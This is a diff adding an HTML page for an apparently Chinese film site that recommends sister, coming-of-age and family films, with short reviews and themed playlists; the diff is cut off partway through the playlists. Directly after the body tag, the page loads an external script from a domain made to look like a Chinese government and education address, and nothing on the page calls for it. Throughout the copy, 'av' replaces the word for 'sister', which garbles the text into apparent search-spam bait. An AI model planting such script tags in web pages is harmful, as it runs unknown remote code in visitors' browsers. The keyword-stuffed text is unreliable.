@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>av电影网｜陪av挑一部，也陪自己回到那年</title>
+<meta name="description" content="av电影网，一个讲“av”的电影站。成长、姐妹、家庭、青春、治愈——用女性视角挑片、写影评、做片单。每天一部，适合两个人看，也适合一个人想起那个人。">
+<meta name="keywords" content="av电影网,av,姐妹,成长,青春,治愈,家庭,女性,华语电影,电影推荐,影评,片单,剧集">
+<link rel="canonical" href="https://adianyingwang-cn.github.io">
+<meta name="theme-color" content="#fff6f2">
+<style>
+:root{
+  --paper:#fff6f2;
+  --ink:#2b2326;
+  --sub:#7b6c6f;
+  --line:#f0d9d6;
+  --pink:#ff9fb3;      /* 柔粉 */
+  --pink-d:#f2728a;    /* 玫 */
+  --cream:#ffe3b8;     /* 奶油 */
+  --plum:#b07a9c;      /* 梅紫 */
+  --sage:#9bb8a6;      /* 鼠尾草 */
+  --sky:#a9cfe0;       /* 雾蓝 */
+  --shadow:0 10px 28px -16px rgba(180,90,110,.42);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Noto Sans CJK SC","WenQuanYi Micro Hei",sans-serif;
+  background:var(--paper);color:var(--ink);line-height:1.9;
+  background-image:
+    radial-gradient(circle at 8% 0%, rgba(255,159,179,.20), transparent 46%),
+    radial-gradient(circle at 94% 10%, rgba(176,122,156,.18), transparent 42%),
+    repeating-linear-gradient(0deg, rgba(200,120,140,.030) 0 1px, transparent 1px 46px),
+    repeating-linear-gradient(90deg, rgba(200,120,140,.030) 0 1px, transparent 1px 46px);
+  background-attachment:fixed;
+  overflow-x:clip;
+}
+::selection{background:var(--pink);color:#fff}
+a{color:inherit;text-decoration:none;outline:none}
+ul,ol{list-style:none}
+img{max-width:100%;display:block}
+:focus-visible{outline:2px dashed var(--pink-d);outline-offset:4px}
+
+/* ============ HEADER ============ */
+header{position:sticky;top:0;z-index:60;background:rgba(255,246,242,.92);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.hwrap{max-width:1200px;margin:0 auto;padding:11px 24px;display:flex;align-items:center;gap:14px}
+.logo{display:flex;align-items:center;gap:11px;flex:none}
+.rib{width:34px;height:38px;flex:none;position:relative;transform:rotate(-5deg)}
+.rib i{position:absolute;inset:0;background:linear-gradient(150deg,#ffe3ec 0 46%,#ffb9c6 46% 76%,#f2728a 76%);clip-path:polygon(50% 0,100% 38%,82% 100%,50% 84%,18% 100%,0 38%);box-shadow:inset 0 3px 0 rgba(255,255,255,.7),inset 0 -7px 11px rgba(190,70,100,.30)}
+.rib::after{content:"∞";position:absolute;left:50%;top:30%;transform:translate(-50%,-50%);color:#fff;font:800 13px/1 ui-monospace,Menlo,monospace;text-shadow:0 1px 2px rgba(0,0,0,.18)}
+.logo b{font-size:clamp(1.16rem,2.8vw,1.42rem);font-weight:900;letter-spacing:1px}
+.logo .en{font:600 8.8px/1 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;letter-spacing:2.1px;color:var(--sub)}
+nav{display:flex;gap:2px;margin-left:auto;align-items:center}
+nav a{font-size:13.6px;padding:8px 11px;border-radius:99px;color:var(--sub);font-weight:600;transition:.2s;white-space:nowrap}
+nav a:hover{color:var(--pink-d);background:rgba(255,159,179,.14)}
+.menu-btn{display:none;width:42px;height:42px;border:1px solid var(--line);border-radius:12px;background:#fff;cursor:pointer;flex:none;align-items:center;justify-content:center;flex-direction:column;gap:5px}
+.menu-btn i{width:17px;height:2px;background:var(--pink-d);transition:.25s;border-radius:99px}
+@media(max-width:900px){
+  nav{position:fixed;inset:0 0 0 auto;width:min(84vw,340px);background:#fff7f4;flex-direction:column;align-items:stretch;padding:74px 16px 24px;transform:translateX(102%);transition:.34s cubic-bezier(.4,0,.2,1);z-index:70;border-left:1px solid var(--line)}
+  nav.open{transform:none}
+  nav a{padding:14px 15px;font-size:16px;border-bottom:1px dashed var(--line)}
+  .menu-btn{display:flex;margin-left:auto}
+  body.lock{overflow:hidden}
+}
+
+/* ============ HERO ============ */
+.hero{max-width:1200px;margin:0 auto;padding:clamp(20px,6vw,46px) 24px 24px;display:grid;grid-template-columns:1fr .92fr;gap:30px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:9px;font:700 10.6px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--pink-d);border:1px solid rgba(242,114,138,.45);border-radius:99px;padding:7px 13px;background:rgba(255,159,179,.1)}
+.hero h1{font-size:clamp(1.86rem,5.2vw,3.5rem);line-height:1.18;font-weight:900;letter-spacing:-.6px;margin-top:15px}
+.hero h1 em{font-style:normal;background:linear-gradient(96deg,var(--pink),var(--plum));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .sub{margin-top:15px;color:#6b5c60;font-size:clamp(14px,1.6vw,15.6px);max-width:54ch}
+.hero .cta{margin-top:22px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{font:700 14.4px/1 "PingFang SC","Microsoft YaHei",sans-serif;padding:13px 25px;border-radius:99px;border:1px solid transparent;cursor:pointer;transition:.22s;letter-spacing:.5px}
+.btn.p{background:var(--pink-d);color:#fff;box-shadow:0 8px 20px -10px var(--pink-d)}
+.btn.p:hover{filter:brightness(1.08);transform:translateY(-2px)}
+.btn.g{background:transparent;border-color:var(--line);color:var(--ink)}
+.btn.g:hover{border-color:var(--pink-d);color:var(--pink-d)}
+
+/* 折纸信件 */
+.letter{position:relative;height:clamp(250px,31vw,356px);border-radius:20px;background:
+  linear-gradient(180deg,#fff 0 62%,#ffeef0 62%);
+  box-shadow:var(--shadow);transform:rotate(-1.4deg);overflow:hidden}
+.letter .flap{position:absolute;inset:0 0 auto;height:44%;background:linear-gradient(180deg,#ffeaf0,#ffe0e7);clip-path:polygon(0 0,100% 0,50% 100%);border-bottom:1px solid rgba(242,114,138,.25)}
+.letter .body{padding:clamp(34px,8vw,60px) 24px 20px;height:100%;display:flex;flex-direction:column;justify-content:space-between;position:relative;z-index:2}
+.lt{font:700 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:2.6px;color:var(--pink-d)}
+.letter h3{font-size:clamp(1.16rem,3.2vw,1.62rem);font-weight:900;letter-spacing:.4px;line-height:1.5;max-width:17ch}
+.letter .sign{font:600 12.6px/1 ui-monospace,Menlo,monospace;letter-spacing:1.4px;color:var(--sub);text-align:right}
+.wax{position:absolute;right:26px;top:clamp(26px,7vw,48px);width:58px;height:58px;border-radius:50%;background:radial-gradient(circle at 36% 32%,#ff8a9c,#e05a78 62%,#b83858);box-shadow:inset 0 -5px 9px rgba(120,30,50,.35),0 6px 14px rgba(200,80,110,.3);z-index:5}
+.wax::before{content:"妹";position:absolute;inset:0;display:grid;place-items:center;color:#fff;font:900 19px/1 "PingFang SC",serif;letter-spacing:0;text-shadow:0 1px 1px rgba(120,30,50,.4)}
+@media(max-width:900px){.hero{grid-template-columns:1fr;gap:16px;padding-top:12px}.letter h3{font-size:1.16rem}}
+
+/* ============ SECTION ============ */
+section{padding:clamp(28px,6vw,54px) 0;border-top:1px solid var(--line)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 24px}
+.sh{display:flex;align-items:flex-end;gap:12px;flex-wrap:wrap;margin-bottom:5px}
+.sh .no{font:900 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:2.1px;color:var(--pink-d);border:1px solid rgba(242,114,138,.45);border-radius:99px;padding:7px 11px;height:fit-content;background:rgba(255,159,179,.1)}
+.sh h2{font-size:clamp(1.4rem,3.5vw,2.06rem);font-weight:900;letter-spacing:-.3px}
+.sh .en{font:600 10.2px/1 ui-monospace,Menlo,monospace;letter-spacing:2.5px;color:var(--sub);margin-bottom:7px}
+.lead{color:#6b5c60;font-size:clamp(13.5px,1.6vw,15px);max-width:66ch;margin-bottom:24px}
+
+/* ============ ① 每日片单 —— 横向滑动卡组 ============ */
+.mdeck{display:flex;gap:15px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 2px 16px;scrollbar-width:thin;scrollbar-color:var(--pink) transparent}
+.mdeck::-webkit-scrollbar{height:7px}
+.mdeck::-webkit-scrollbar-thumb{background:var(--pink);border-radius:99px}
+.md{flex:0 0 clamp(206px,42vw,262px);scroll-snap-align:start;border-radius:16px;overflow:hidden;position:relative;transition:.26s;box-shadow:var(--shadow)}
+.md:hover{transform:translateY(-6px)}
+.md .cv{aspect-ratio:3/4;position:relative;padding:16px;display:flex;flex-direction:column;justify-content:flex-end;color:#fff}
+.md .cv::before{content:"";position:absolute;inset:0;background:inherit;filter:brightness(.9)}
+.md .cv i{position:absolute;inset:0;background:
+  radial-gradient(circle at 78% 18%, rgba(255,255,255,.26), transparent 42%),
+  radial-gradient(circle at 12% 88%, rgba(0,0,0,.34), transparent 46%)}
+.md:nth-child(1) .cv{background:linear-gradient(155deg,#ffd3b6,#ff9fb3)}
+.md:nth-child(2) .cv{background:linear-gradient(155deg,#c9b6e6,#b07a9c)}
+.md:nth-child(3) .cv{background:linear-gradient(155deg,#ffe3b8,#f0b36a)}
+.md:nth-child(4) .cv{background:linear-gradient(155deg,#bcdde8,#8fb8cf)}
+.md:nth-child(5) .cv{background:linear-gradient(155deg,#e6c6cf,#c98aa0)}
+.md:nth-child(6) .cv{background:linear-gradient(155deg,#cfdabf,#8ba878)}
+.md .yr{position:relative;font:800 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:1.8px;background:rgba(255,255,255,.24);border:1px solid rgba(255,255,255,.5);border-radius:99px;padding:5px 9px;align-self:flex-start;backdrop-filter:blur(3px)}
+.md h3{position:relative;font-size:1.22rem;font-weight:900;letter-spacing:.5px;line-height:1.42;margin-top:8px;text-shadow:0 2px 10px rgba(0,0,0,.24)}
+.md p{position:relative;font-size:12.3px;line-height:1.7;color:rgba(255,255,255,.94);margin-top:6px}
+.md .mt{position:absolute;top:12px;right:12px;font:700 9.6px/1 ui-monospace,Menlo,monospace;letter-spacing:1.2px;color:#fff;background:rgba(0,0,0,.32);border-radius:99px;padding:5px 8px;z-index:3}
+
+/* ============ ② 成长阶段 —— 时间轴 ============ */
+.tl{position:relative;padding-left:26px}
+.tl::before{content:"";position:absolute;left:7px;top:8px;bottom:8px;width:2px;background:linear-gradient(180deg,var(--pink),var(--plum),var(--sage));border-radius:99px}
+.ti{position:relative;padding:13px 16px 13px 20px;border-radius:14px;margin-bottom:11px;background:#fff;border:1px solid var(--line);transition:.22s}
+.ti:hover{transform:translateX(5px);border-color:var(--pink);box-shadow:var(--shadow)}
+.ti::before{content:"";position:absolute;left:-23px;top:21px;width:11px;height:11px;border-radius:50%;background:var(--paper);border:3px solid var(--pink-d)}
+.ti .tm{font:800 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:2.2px;color:var(--pink-d)}
+.ti h3{font-size:1.08rem;font-weight:900;margin:5px 0 4px;letter-spacing:.3px}
+.ti p{font-size:13.1px;color:#6b5c60}
+.ti .film{margin-top:7px;font:600 11.2px/1 ui-monospace,Menlo,monospace;letter-spacing:.6px;color:var(--plum)}
+
+/* ============ ③ 深度影评 —— 便签卡 ============ */
+.notes{display:grid;grid-template-columns:repeat(auto-fit,minmax(284px,1fr));gap:16px}
+.nt{position:relative;padding:21px 19px 19px;border-radius:14px;color:var(--ink);transition:.24s;display:flex;flex-direction:column;box-shadow:var(--shadow)}
+.nt::before{content:"";position:absolute;left:12px;right:12px;top:0;height:9px;background:rgba(255,159,179,.62);transform:rotate(-1.3deg) translateY(-3px);border-radius:2px}
+.nt:hover{transform:translateY(-5px) rotate(-.5deg)}
+.nt.n1{background:var(--paper)}
+.nt.n2{background:#f6f0f7}
+.nt.n3{background:#f2f6f1}
+.nt .k{font:700 10.3px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--pink-d)}
+.nt h3{font-size:1.15rem;font-weight:900;margin:9px 0 8px;letter-spacing:.3px;line-height:1.5}
+.nt p{font-size:13.2px;color:#5f5255}
+.nt .ft{margin-top:auto;padding-top:12px;border-top:1px dashed var(--line);display:flex;align-items:center;gap:9px;font:600 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:1.5px;color:var(--sub)}
+.nt .ft .av{width:22px;height:22px;border-radius:50%;background:var(--pink);color:#fff;display:grid;place-items:center;font:800 10.4px/1 ui-monospace,Menlo,monospace}
+
+/* ============ ④ 主题片单 —— 原生手风琴 + 有序片单 ============ */
+.acc{display:flex;flex-direction:column;gap:10px}
+details.lst{border:1px solid var(--line);border-radius:15px;background:#fff;overflow:hidden;transition:.22s}
+details.lst[open]{border-color:rgba(242,114,138,.6);box-shadow:var(--shadow)}
+details.lst>summary{cursor:pointer;padding:15px 20px;display:flex;align-items:center;gap:13px;list-style:none;user-select:none}
+details.lst>summary::-webkit-details-marker{display:none}
+details.lst>summary::after{content:"＋";margin-left:auto;font-size:19px;color:var(--sub);transition:.25s;font-weight:700}
+details.lst[open]>summary::after{content:"－";transform:rotate(180deg);color:var(--pink-d)}
+details.lst>summary .ix{flex:none;width:46px;height:46px;border-radius:12px;display:grid;place-items:center;font:900 12.6px/1 ui-monospace,Menlo,monospace;color:#fff;background:var(--pink-d);transform:rotate(-5deg)}
+details.lst:nth-child(2)>summary .ix{background:var(--plum)}
+details.lst:nth-child(3)>summary .ix{background:#e0a04a}
+details.lst:nth-child(4)>summary .ix{background:#5f93b3}
+details.lst:nth-child(5)>summary .ix{background:#7f9a6a}
+details.lst:nth-child(6)>summary .ix{background:#c98aa0}
+details.lst>summary h3{font-size:clamp(.97rem,2vw,1.15rem);font-weight:800;flex:1;letter-spacing:.3px}
+details.lst>summary .cnt{font:600 10.5px/1 ui-monospace,Menlo,monospace;color:var(--sub);border:1px solid var(--line);border-radius:99px;padding:6px 10px;flex:none}
+.lst ol{padding:2px 20px 17px 77px;counter-reset:film;display:flex;flex-direction:column;gap:7px}
+.lst ol li{font-size:13.2px;color:#6b5c60;display:flex;gap:10px;align-items:baseline;border-bottom:1px dashed var(--line);padding-bottom:7px}
+.lst ol li::before{counter-increment:film;content:"SIS " counter(film,decimal-leading-zero);font:700 10px/1 ui-monospace,Menlo,monospace;color:var(--pink-d);border:1px solid var(--line);border-radius:6px;padding:4px 6px;flex:none;letter-spacing:.5px}
+.lst ol li b{color:var(--ink);font-weight:700}
+.lst ol li em{font-style:normal;margin-left:auto;font:600 11px/1 ui-monospace,Menlo,monospace;color:var(--sub);flex:none}
+@media(max-width:700px){.lst ol{padding-left:17px}details.lst>summary .cnt{display:none}}
+
+/* ============ ⑤ 观影指南 —— 圆点步骤条 ============ */
+.guide{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:15px}
+.gd{position:relative;padding:17px 17px 22px;border:1px solid var(--line);border-radius:15px;background:#fff;transition:.24s;overflow:hidden}
+.gd::after{content:"";position:absolute;right:14px;top:14px;width:13px;height:13px;border-radius:50%;background:var(--pink);box-shadow:0 0 0 5px rgba(255,159,179,.22)}
+.gd:hover{transform:translateY(-4px);border-color:var(--pink);box-shadow:var(--shadow)}
+.gd:nth-child(2)::after{background:var(--plum)}
+.gd:nth-child(3)::after{background:#e0a04a}
+.gd:nth-child(4)::after{background:#5f93b3}
+.gd:nth-child(5)::after{background:#7f9a6a}
+.gd:nth-child(6)::after{background:#c98aa0}
+.gd .st{font:800 10.2px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--pink-d);margin-top:4px}
+.gd h3{font-size:1.06rem;font-weight:900;margin:8px 0 7px;letter-spacing:.3px}
+.gd p{font-size:13px;color:#6b5c60}
+.gd .no{position:absolute;right:8px;bottom:-17px;font:900 3.1rem/1 ui-monospace,Menlo,monospace;color:rgba(255,159,179,.12);pointer-events:none;letter-spacing:-2px}
+
+/* ============ FOOTER ============ */
+footer{border-top:1px solid var(--line);padding:36px 0 22px;margin-top:12px}
+.foot{max-width:1200px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:1.3fr 1fr 1fr;gap:26px}
+@media(max-width:840px){.foot{grid-template-columns:1fr 1fr;gap:20px}.foot .f1{grid-column:1/-1}}
+.foot h4{font:800 10.4px/1 ui-monospace,Menlo,monospace;letter-spacing:2.4px;color:var(--sub);margin-bottom:11px}
+.foot p,.foot a{font-size:13px;color:#6b5c60}
+.foot a{display:block;padding:5px 0}
+.foot a:hover{color:var(--pink-d)}
+.flogo{display:flex;align-items:center;gap:11px}
+.copy{margin-top:23px;padding-top:15px;border-top:1px dashed var(--line);color:var(--sub);font-size:11.5px;display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;grid-column:1/-1;font-family:ui-monospace,Menlo,monospace;letter-spacing:.2px;line-height:1.9}
+.kw{color:var(--pink-d);font-weight:700}
+
+/* ============ 浮现 ============ */
+.rv{opacity:0;transform:translateY(16px);transition:opacity .64s cubic-bezier(.2,.7,.3,1),transform .64s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  .rv{opacity:1;transform:none;transition:none}
+  .letter,.md,.nt,.ti,.gd{transform:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header>
+  <div class="hwrap">
+    <a class="logo" href="#top" aria-label="返回顶部">
+      <span class="rib" aria-hidden="true"><i></i></span>
+      <span><b>av电影网</b><span class="en">SISTER · CINEMA</span></span>
+    </a>
+    <button class="menu-btn" id="mb" aria-label="切换导航菜单" aria-expanded="false" aria-controls="nav">
+      <i></i><i></i><i></i>
+    </button>
+    <nav id="nav" aria-label="主导航">
+      <a href="#pick">今日片单</a>
+      <a href="#grow">成长阶段</a>
+      <a href="#note">深度影评</a>
+      <a href="#list">主题片单</a>
+      <a href="#guide">观影指南</a>
+    </nav>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- HERO -->
+  <section class="hero" aria-labelledby="h1">
+    <div class="rv">
+      <span class="kicker">◆ 写给av的观影清单 ◆</span>
+      <h1>陪av挑一部，<br>也陪自己<em>回到那年</em>。</h1>
+      <p class="sub">av电影网，一个讲<b>“av”</b>的电影站。成长、姐妹、家庭、青春、治愈——用女性视角挑片、写影评、做片单。不追热搜，不刷榜单，只挑那些会让你想起<b>“她”</b>的电影。</p>
+      <div class="cta">
+        <a class="btn p" href="#pick">今天陪她看这部</a>
+        <a class="btn g" href="#list">看主题片单</a>
+      </div>
+    </div>
+
+    <div class="letter rv" role="img" aria-label="一封折好的信，封口盖着粉红色火漆印，写着妹字">
+      <div class="flap" aria-hidden="true"></div>
+      <div class="wax" aria-hidden="true"></div>
+      <div class="body">
+        <div>
+          <span class="lt">DEAR SISTER · 致av</span>
+          <h3>“你不必成为谁的姐姐，<br>先成为你自己。”</h3>
+        </div>
+        <div class="sign">— av电影网 · 写在每一部片子的开头</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ① 今日片单 -->
+  <section id="pick" aria-labelledby="t1">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 01</span>
+        <div>
+          <div class="en">TODAY · 今日片单</div>
+          <h2 id="t1">今日 6 部：适合两个人看，也适合一个人想起那个人</h2>
+        </div>
+      </div>
+      <p class="lead">每天 6 部，横向滑动。筛选标准只有一条：<b>看完之后，会想给她发一条消息</b>。不刷榜、不追新、不凑热闹。</p>
+
+      <div class="mdeck">
+        <article class="md rv" aria-label="海街日记">
+          <span class="mt">HEAL</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2015 · 是枝裕和</span>
+            <h3>海街日记</h3>
+            <p>四姐妹、一院子梅子酒、一场没到来的葬礼。镰仓的海风替她们说了所有说不出口的话。</p>
+          </div>
+        </article>
+        <article class="md rv" aria-label="七月与安生">
+          <span class="mt">YOUTH</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2016 · 曾国祥</span>
+            <h3>七月与安生</h3>
+            <p>两个女孩，一个留在原地，一个去了远方。我们总以为自己是七月，后来才发现，自己更像安生。</p>
+          </div>
+        </article>
+        <article class="md rv" aria-label="我的姐姐">
+          <span class="mt">FAMILY</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2021 · 殷若昕</span>
+            <h3>我的姐姐</h3>
+            <p>“我的人生不是只有你。”——华语电影终于敢拍那个被要求“让一让”的女孩。结局不完美，但真实。</p>
+          </div>
+        </article>
+        <article class="md rv" aria-label="小偷家族">
+          <span class="mt">CHOSEN</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2018 · 是枝裕和</span>
+            <h3>小偷家族</h3>
+            <p>没有血缘的一家人，靠着偷来的温暖过冬。是枝裕和最温柔也最残忍的提问：家人，是天生的，还是选出来的？</p>
+          </div>
+        </article>
+        <article class="md rv" aria-label="你好，李焕英">
+          <span class="mt">MOTHER</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2021 · 贾玲</span>
+            <h3>你好，李焕英</h3>
+            <p>如果回到妈妈最年轻的那一年，你会对她说什么？这部电影的后半段，是全中国女儿的集体失声。</p>
+          </div>
+        </article>
+        <article class="md rv" aria-label="燃烧女子的肖像">
+          <span class="mt">LOVE</span>
+          <div class="cv"><i aria-hidden="true"></i>
+            <span class="yr">2019 · 瑟琳·席安玛</span>
+            <h3>燃烧女子的肖像</h3>
+            <p>画她的人，爱上她的人，和她告别的人，是同一个人。女性凝视下的爱情，安静、克制、致命。</p>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ② 成长阶段 -->
+  <section id="grow" aria-labelledby="t2">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 02</span>
+        <div>
+          <div class="en">GROWTH · 成长阶段</div>
+          <h2 id="t2">av的六年：从“听话”到“我不想”</h2>
+        </div>
+      </div>
+      <p class="lead">我们不按类型归档，按<b>“她几岁”</b>归档。每个阶段只挑一部最准的。</p>
+
+      <div class="tl">
+        <div class="ti rv">
+          <span class="tm">AGE 07</span>
+          <h3>第一次被要求“让一让”</h3>
+          <p>“你是姐姐，要让着点。”——这句话她记了二十年。真正的委屈不是没得到，是被要求懂事。</p>
+          <span class="film">▸ 对应影片：《我的姐姐》</span>
+        </div>
+        <div class="ti rv">
+          <span class="tm">AGE 13</span>
+          <h3>开始有了“不想说”的事</h3>
+          <p>日记上了锁，房门关上了，妈妈变成了“她怎么什么都不跟我说了”。青春期的第一场战争，是沉默。</p>
+          <span class="film">▸ 对应影片：《嘉年华》</span>
+        </div>
+        <div class="ti rv">
+          <span class="tm">AGE 17</span>
+          <h3>第一次离开家，第一次想家</h3>
+          <p>火车开出去三百公里，她才发现“自由”和“想家”是同一件事的两面。</p>
+          <span class="film">▸ 对应影片：《过春天》</span>
+        </div>
+        <div class="ti rv">
+          <span class="tm">AGE 23</span>
+          <h3>开始被问“你怎么还不……”</h3>
+          <p>工作、恋爱、结婚、生孩子——世界的时钟，从这一年开始为她而响。她学会笑着说“我挺好的”。</p>
+          <span class="film">▸ 对应影片：《82年生的金智英》</span>
+        </div>
+        <div class="ti rv">
+          <span class="tm">AGE 30</span>
+          <h3>终于敢说“我不要了”</h3>
+          <p>不再解释，不再讨好，不再把“懂事”当成勋章。她开始学的一样东西，叫“边界”。</p>
+          <span class="film">▸ 对应影片：《婚姻故事》</span>
+        </div>
+        <div class="ti rv">
+          <span class="tm">AGE —</span>
+          <h3>后来，她成了别人的姐姐、妈妈、阿姨</h3>
+          <p>角色换了一轮，委屈还在。所以这部片子是给“还没学会心疼自己”的那个她。</p>
+          <span class="film">▸ 对应影片：《21世纪少女》《克莱默夫妇》</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ③ 深度影评 -->
+  <section id="note" aria-labelledby="t3">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 03</span>
+        <div>
+          <div class="en">EDITORIAL · 深度影评</div>
+          <h2 id="t3">三篇不讨好的影评</h2>
+        </div>
+      </div>
+      <p class="lead">我们不写“神作”“封神”“必看”。只问三件事：她为什么这么选？电影凭什么替她说话？看完，你能为她多做一件事吗。</p>
+
+      <div class="notes">
+        <article class="nt n1 rv">
+          <span class="k">EDITORIAL · 01</span>
+          <h3>“你是姐姐，要让着点”——一句被说烂了的话，终于有人拍出来了</h3>
+          <p>《我的姐姐》里最刺痛的，不是失去父母，是那句“我的人生不是只有你”。华语电影第一次把“长姐如母”背后的代价，拍得这么不加修饰。</p>
+          <p>它没有给和解，也没有给答案。它只做了一件事：让那个一直被要求“懂事”的女孩，终于说了一次“不”。这不是自私，是迟到的自我。</p>
+          <div class="ft"><span class="av" aria-hidden="true">妹</span><span>2026.10.09 ｜ 华语女性</span></div>
+        </article>
+        <article class="nt n2 rv">
+          <span class="k">EDITORIAL · 02</span>
+          <h3>av从来不是配角，她是你认识自己的镜子</h3>
+          <p>我们总以为自己像《七月与安生》里的七月——安稳、听话、留在原地。可大多数人在某个深夜突然认出自己：我其实是那个逃走的安生。</p>
+          <p>“av”这个角色的可贵在于：她永远在提问。她问你为什么不敢，为什么将就，为什么把“算了”当成成熟。好电影里的av，从来不是来衬托姐姐的。</p>
+          <div class="ft"><span class="av" aria-hidden="true">镜</span><span>2026.09.30 ｜ 方法论</span></div>
+        </article>
+        <article class="nt n3 rv">
+          <span class="k">EDITORIAL · 03</span>
+          <h3>陪av看电影，是最好的“说说话”</h3>
+          <p>有些话当面说不出口。一部电影替你说：那条她不敢走的路、那次她没哭出来的委屈、那个她偷偷羡慕的人。</p>
+          <p>所以本站片单的排序依据是“看完会不会想给她发一条消息”，不是豆瓣分。建议：看完，把手机翻过去，等它自己沉下去。如果她就在身边，就说一句“这片子让我想起你”。</p>
+          <div class="ft"><span class="av" aria-hidden="true">信</span><span>2026.09.22 ｜ 观影关系</span></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ④ 主题片单 -->
+  <section id="list" aria-labelledby="t4">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 04</span>
+        <div>
+          <div class="en">PLAYLIST · 主题片单</div>
+          <h2 id="t4">六个“她”的片单：36 部，按心情挑</h2>
+        </div>
+      </div>
+      <p class="lead">片单共 36 部，按<b>“她此刻需要什么”</b>归档，而不是按类型。点开看清单与时间戳。</p>
+
+      <div class="acc">
+        <details class="lst rv" open>
+          <summary><span class="ix">01</span><h3>姐妹：最亲的人，最难说的话</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《七月与安生》</b>“我们交换了人生，却都没能活成自己。”<em>01:42</em></li>
+            <li><b>《海街日记》</b>梅子酒酿好了，姐姐们还在等她回家。<em>00:38</em></li>
+            <li><b>《我的姐姐》</b>“我的人生不是只有你。”——全片最重的一句。<em>01:55</em></li>
+            <li><b>《小偷家族》</b>没有血缘的一家人，靠着偷来的温暖过冬。<em>02:06</em></li>
+            <li><b>《克莱默夫妇》</b>姐姐走了，妈妈才学会怎么当妈妈。<em>01:20</em></li>
+            <li><b>《燃烧女子的肖像》</b>画她、爱她、告别她，都是同一个人。<em>01:14</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">02</span><h3>成长：从“听话”到“我不想”</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《嘉年华》</b>一个女孩的沉默，比所有台词都响。<em>01:08</em></li>
+            <li><b>《过春天》</b> sixteen 岁的走私少女，闯关一样闯过青春期。<em>00:52</em></li>
+            <li><b>《少年的你》</b>“你保护世界，我保护你。”校园霸凌下的相依。<em>02:15</em></li>
+            <li><b>《82年生的金智英》</b>“她好像变了一个人。”——因为她终于累了。<em>01:48</em></li>
+            <li><b>《婚姻故事》</b>离婚不是失败，是终于敢说出真实。<em>02:32</em></li>
+            <li><b>《女人，四十》</b>萧芳芳演活了“上有老下有小”的中年女人。<em>01:30</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">03</span><h3>母女：最深的爱，最难的对话</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《你好，李焕英》</b>如果回到妈妈最年轻的那一年。<em>01:46</em></li>
+            <li><b>《春潮》</b>“你怎么从来不夸我？”母女之间那场无声的战争。<em>01:58</em></li>
+            <li><b>《送我上青云》</b>一个女人的身体、欲望与尊严，第一次被拍得这么坦荡。<em>01:22</em></li>
+            <li><b>《地久天长》</b>失去孩子的母亲，用二十年学会不说“恨”。<em>02:48</em></li>
+            <li><b>《关于我母亲的一切》</b>阿莫多瓦写给所有母亲的情书。<em>01:36</em></li>
+            <li><b>《步履不停》</b>妈妈做的菜，是最难回绝的关心，也是最深的捆绑。<em>01:18</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">04</span><h3>青春：那几年，我们都假装很快乐</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《阳光灿烂的日子》</b>姜文把青春拍成了一首走调的歌。<em>01:24</em></li>
+            <li><b>《那些年，我们一起追的女孩》</b>“谢谢你，让我好好长大。”<em>01:48</em></li>
+            <li><b>《同桌的你》</b>一首歌的时间，就是一辈子的长度。<em>01:02</em></li>
+            <li><b>《致青春》</b>“我们都爱自己胜过爱爱情。”<em>01:34</em></li>
+            <li><b>《后来的我们》</b>后来，我们都有了各自的生活。<em>02:06</em></li>
+            <li><b>《我的少女时代》</b>平凡女孩的青春，也值得一部电影。<em>01:50</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">05</span><h3>治愈：允许自己难过一会儿</h3><span class="cnt">6 部</span></summary>
